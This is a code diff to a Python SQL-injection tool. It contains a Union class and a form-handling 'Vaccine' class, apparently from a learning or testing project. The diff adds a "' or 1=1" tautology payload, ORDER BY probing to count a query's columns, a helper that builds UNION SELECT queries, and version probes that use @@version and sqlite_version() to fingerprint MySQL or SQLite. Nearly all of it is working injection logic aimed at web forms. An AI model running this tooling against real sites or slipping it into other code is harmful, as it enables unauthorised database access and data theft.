@@ -66,22 +66,32 @@ class Union:
 		self.comment = comment
 
 		self.original_text = self.submit("").text
-
+		self.normal_text = self.submit("' or 1=1" + self.comment).text
 		self.column_counts = self.check_num_colums()
+
+		self.mysql = True
 		
 	def check_num_colums(self):
-		for i in range(1, 10):
+		flag = 0
+		for i in range(1, 12):
 			q = f" ORDER BY {i}"
 			query = self.delimiter + q + self.comment
 			res = self.submit(query)
 			#print(res.text)
 			result = get_diff(self.original_text, res.text)
 			if res.text and not result:
+				flag = 1
+				continue
+			result = get_diff(self.normal_text, res.text)
+			if len(self.normal_text) == len(res.text):
+				flag = 1
+				continue
+			if not result:
 				continue
 			#print("result", result)
 			break
-		column_counts = i - 1
-		if column_counts == 0:
+		column_counts = i - flag
+		if column_counts == 0 or column_counts >= 10:
 			raise self.UnionException("this method does not work")
 		print(f"column counts: {column_counts}")
 		return column_counts
@@ -92,13 +102,29 @@ class Union:
 		query = self.header + "SELECT " + colums + contents + self.comment
 		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
 		res = self.submit(query)
+		#print(res.text)
 		result = get_result(self.original_text, res.text, query)
 		if not result:
 			raise self.UnionException("this method does not work")
 		print(result)
 
+	def check_union(self, column_name, contents):
+		column_lst = [column_name] * self.column_counts
+		colums = ", ".join(column_lst)
+		query = self.header + "SELECT " + colums + contents + self.comment
+		print(f"{Style.CYAN}QUERY: {query}{Style.RESET}")
+		res = self.submit(query)
+		#print(res.text)
+		result = get_result(self.original_text, res.text, query)
+		return result
+
 	def get_version(self):
-		self.exec_union("@@version", "")
+		result = self.check_union("@@version", "")
+		if result:
+			return
+		result = self.check_union("sqlite_version()", "")
+		if result:
+			self.mysql = False
 
 	def get_database_name(self):
 		self.exec_union("DATABASE()", "")
@@ -166,7 +192,7 @@ class Vaccine:
 			if method_match.group(1).lower() != self.method:
 				continue
 			filtered_froms.append(form[0])
-
+		#print(forms)
 		if not filtered_froms:
 			error_exit("method does not match")
 		if len(filtered_froms) > 1:
